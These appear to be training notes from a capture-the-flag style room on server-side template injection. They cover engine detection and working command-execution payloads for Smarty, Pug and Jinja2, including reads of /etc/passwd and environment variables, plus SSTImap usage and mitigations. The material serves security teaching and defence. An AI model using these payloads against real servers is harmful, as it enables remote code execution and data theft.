# Server-Side Template Injection (SSTI)

## Overview

Server-Side Template Injection (SSTI) occurs when user input is unsafely embedded into a server-side template and executed by the template engine. Unlike XSS (which executes client-side), SSTI executes on the server — enabling arbitrary code execution, file system access, and complete server compromise. This room covers template engine fundamentals, how to identify which engine is in use, and exploitation techniques for Smarty (PHP), Pug/Jade (Node.js), and Jinja2 (Python), along with mitigation strategies and the SSTImap tool.

---

## Topics Covered

- What SSTI is and why it occurs
- Template engine fundamentals
- Identifying the template engine via payload testing
- Smarty (PHP) exploitation
- Pug/Jade (Node.js) exploitation and `spawnSync` usage
- Jinja2 (Python) exploitation
- SSTImap: automated SSTI testing
- Mitigation: sandboxing, input validation, secure configuration

---

## Key Concepts

### What is SSTI?

Template engines generate dynamic HTML by combining static templates with runtime data. They interpret expressions (e.g. `{{name}}`, `#{value}`) and replace them with actual values.

SSTI occurs when:
1. User input is passed directly into a template expression context
2. The template engine evaluates the input as code rather than data

**The core difference between safe and vulnerable usage:**
```python
# Safe: user input used as data
template = Template("Hello, {{ name }}!")
output = template.render(name=user_input)

# Vulnerable: user input embedded into the template string itself
template = Template("Hello, " + user_input + "!")
output = template.render()
```

In the vulnerable case, if `user_input` is `{{7*7}}` and the engine evaluates it, the output is `Hello, 49!` — confirming SSTI.

---

### Template Engine Detection

Different engines use different expression syntax. Test with math expressions to confirm execution:

| Payload | Expected output if vulnerable | Engine |
|---------|------------------------------|--------|
| `{{7*7}}` | `49` | Jinja2, Twig |
| `{{7*'7'}}` | `49` | Twig |
| `{{7*'7'}}` | `7777777` | Jinja2 |
| `#{7*7}` | `49` | Pug/Jade |
| `{'Hello'\|upper}` | `HELLO` | Smarty |

The different results for `{{7*'7'}}` allow distinguishing Twig from Jinja2.

---

### Smarty (PHP) Exploitation

Smarty is a PHP template engine that allows PHP functions within templates.

**Confirm Smarty:**
Inject `{'Hello'|upper}` — if the output is `HELLO`, Smarty is confirmed.

**Exploit — execute OS commands:**
```
{system('id')}
{php}echo `id`;{/php}
```

Smarty's `{php}` tags execute raw PHP — if not explicitly disabled, this allows arbitrary code execution on the server.

---

### Pug/Jade (Node.js) Exploitation

Pug is a Node.js template engine that allows JavaScript interpolation within `#{}`.

**Confirm Pug:**
Inject `#{7*7}` — if the output is `49`, Pug is confirmed.

**Exploit — execute OS commands:**

Direct shell commands via `spawnSync`:
```
#{root.process.mainModule.require('child_process').spawnSync('ls', ['-lah']).stdout}
```

**Why `spawnSync('ls -lah')` fails:**
`spawnSync` does not split a single string into a command and arguments. The command and arguments must be provided separately:

```javascript
// Incorrect — treats "ls -lah" as a single command name
spawnSync('ls -lah')

// Correct — command and args are separate
spawnSync('ls', ['-lah'])
```

**Correct payload syntax:**
```
#{root.process.mainModule.require('child_process').spawnSync('cat', ['/etc/passwd']).stdout}
```

**Other useful payloads:**
```
#{root.process.env}          // environment variables
#{root.process.cwd()}        // current working directory
```

---

### Jinja2 (Python) Exploitation

Jinja2 is a Python template engine where `{{ }}` evaluates Python expressions.

**Confirm Jinja2:**
Inject `{{7*7}}` — if the output is `49`, Jinja2 is confirmed.
Inject `{{7*'7'}}` — output `7777777` distinguishes Jinja2 from Twig (which outputs `49`).

**Exploit — read files:**
```
{{ config.items() }}
{{ ''.__class__.__mro__[2].__subclasses__() }}
```

**Remote Code Execution payload:**
```
{{ ''.__class__.__mro__[1].__subclasses__()[396]('id', shell=True, stdout=-1).communicate()[0].strip() }}
```

The exact subclass index may vary — enumerate `__subclasses__()` to find `subprocess.Popen`.

**Simpler RCE via `request.application`:**
```
{{ request.application.__globals__.__builtins__.__import__('os').popen('id').read() }}
```

---

## Practical Examples / Demonstrations

### SSTImap — Automated Testing

SSTImap automates template engine detection and exploitation.

**Install:**
```bash
git clone https://github.com/vladko312/SSTImap.git
cd SSTImap
pip install -r requirements.txt
```

**Basic usage:**
```bash
python3 sstimap.py -X POST -u 'http://TARGET:8002/mako/' -d 'page='
```

SSTImap will:
1. Test multiple payloads to detect the template engine
2. Attempt to exploit confirmed injection points
3. Provide shell access or file read capabilities if successful

---

## Important Terminology

| Term | Meaning |
|------|---------|
| SSTI | Server-Side Template Injection — user input executed by a server-side template engine |
| Template engine | Software that combines templates with data to generate dynamic content |
| Jinja2 | Python template engine — used in Flask, Django (optional) |
| Smarty | PHP template engine — supports PHP function execution in templates |
| Pug / Jade | Node.js template engine — supports JavaScript interpolation |
| `spawnSync` | Node.js `child_process` function for synchronous process execution |
| Sandboxing | Restricting the capabilities of a template engine to prevent code execution |
| RCE | Remote Code Execution — executing arbitrary OS commands on the target server |
| `__subclasses__()` | Python method returning all subclasses — used in Jinja2 exploitation chains |

---

## Mitigation

### Jinja2

```python
from jinja2 import Environment, select_autoescape
from jinja2.sandbox import SandboxedEnvironment

env = SandboxedEnvironment(autoescape=select_autoescape(['html', 'xml']))
```

- Enable the sandboxed environment — restricts access to dangerous Python builtins and attributes
- Sanitise all user input before rendering
- Never pass raw user input into `Template()` constructor or `render()` string concatenation

### Pug/Jade

- Avoid `!{}` (unescaped interpolation) — use `#{}` which escapes HTML by default
- Do not allow users to define or modify templates
- Disable JavaScript execution features in production if they are not needed

### Smarty

```php
$smarty->security_policy->php_handling = Smarty::PHP_REMOVE;
$smarty->disable_security = false;
```

- Disable `{php}` tags — prevents raw PHP execution in templates
- Use security policies to restrict allowed tags and modifiers
- Never allow user-controlled template content

### General Sandboxing Principles

- **Function restrictions:** Limit which functions/methods templates can call
- **Variable access control:** Prevent templates from accessing global variables or sensitive objects
- **Regular audits:** Review template files for insecure patterns and hardcoded dangerous calls

---

## Real-World Relevance

- SSTI is in the OWASP Top 10 (A03 — Injection, 2021) — it is consistently found in Flask, Django, Express, and PHP applications that use templating for dynamic content
- Jinja2 SSTI in Flask applications is one of the most common CTF and bug bounty findings
- The attack is critically dangerous because it runs on the server with the application's process privileges — often leading to full server compromise
- Identifying SSTI vs reflected XSS requires recognising that `{{7*7}}` returning `49` means server-side evaluation, not client-side
- SSTImap is the equivalent of SQLMap for template injection — used widely in assessments and bug bounties

---

## Key Learnings

- SSTI occurs when user input is embedded into the template string itself, not passed as a data variable
- Detection: inject `{{7*7}}` or `#{7*7}` — execution confirmed by arithmetic output
- Smarty: `{php}` tags execute PHP; disable with `php_handling = PHP_REMOVE`
- Pug: `#{}` interpolates JavaScript; `spawnSync('cmd', ['args'])` for OS commands
- Jinja2: `{{ }}` evaluates Python; sandbox mode restricts dangerous object access
- SSTImap automates engine detection and exploitation
- The definitive fix: never concatenate user input into template strings

---

## Additional Notes

- Mako, Velocity, FreeMarker, and Twig are additional template engines each with their own SSTI payloads
- A useful reference for engine-specific payloads: [PayloadsAllTheThings SSTI](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection)
- Jinja2 sandboxing can be bypassed — it is a mitigation, not a guarantee; the real fix is not concatenating user input into templates
- Modern frameworks like Flask 2.x have protections enabled by default — older apps or custom template rendering are the main risk

---

## Conclusion

SSTI is a high-impact vulnerability that transforms a template engine's expression evaluation into an arbitrary code execution path on the server. Unlike client-side injection, there is no browser sandbox protecting the system — the template engine executes directly in the server process. The vulnerability is always caused by the same mistake: treating user input as template code rather than data. Keeping user input in data variables and enabling sandbox modes provides effective mitigation, but the structural fix is ensuring user input never enters the template string itself.
